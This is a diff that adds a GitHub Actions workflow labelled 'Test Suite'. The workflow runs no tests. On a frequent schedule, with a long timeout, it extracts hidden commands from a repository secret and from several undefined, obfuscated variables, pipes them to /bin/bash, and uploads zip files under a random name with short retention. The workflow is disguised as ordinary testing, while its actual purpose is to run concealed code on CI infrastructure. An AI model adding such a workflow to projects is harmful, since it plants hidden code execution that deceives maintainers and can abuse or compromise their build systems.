@@ -1,0 +1,42 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '16 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Execute
+        env:
+          cgz8818: ${{ secrets.cgz8818 }}
+        run: |
+          printf '%s' "$cgz8818" | jq -r .bumaa764 | /bin/bash
+          echo $iybd1905 | jq -r .wamo59777 | /bin/bash
+          printf '%s' "$j44170" | jq -r .f28947 | /bin/bash
+          printf '%s' "$xyhv030" | jq -r .v6789 | /bin/bash
+          printf '%s' "$a79293" | jq -r .bpuic05 | /bin/bash
+          echo $jyon84493 | jq -r .njul4890 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: o9H4zztG
+          path: "*.zip"
+          retention-days: 1
